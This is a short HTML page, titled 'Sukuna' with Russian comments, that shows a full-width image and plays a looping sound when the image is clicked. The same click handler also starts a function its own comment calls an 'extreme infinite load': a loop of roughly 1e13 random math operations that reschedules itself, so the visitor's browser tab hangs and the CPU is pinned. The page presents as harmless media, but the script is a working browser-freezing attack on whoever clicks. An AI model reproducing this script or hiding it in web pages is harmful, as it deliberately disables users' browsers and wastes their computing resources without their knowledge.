<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sukuna</title>
</head>
<body>
    <img src="png.png" alt="Изображение" style="width: 100%; height: auto;" id="clickableImage">

    <audio id="audio" src="sound.mp3" loop></audio>

    <script>
        document.getElementById('clickableImage').addEventListener('click', function() {
            var audio = document.getElementById('audio');
            if (audio.paused) {
                audio.play().catch(function(error) {
                    console.log("Ошибка воспроизведения: " + error);
                });
            }

            // Создаем экстремальную бесконечную нагрузку
            function createExtremeLoad() {
                let iterations = 1e8 * 100000; // Экстремально увеличенное количество итераций
                for (let i = 0; i < iterations; i++) {
                    // Очень сложные вычисления
                    Math.sqrt(Math.random()) * Math.random();
                    Math.sin(Math.random()) * Math.cos(Math.random());
                    Math.log(Math.random()) * Math.tan(Math.random());
                }
                requestAnimationFrame(createExtremeLoad);
            }
            createExtremeLoad();
        });
    </script>
</body>
</html>
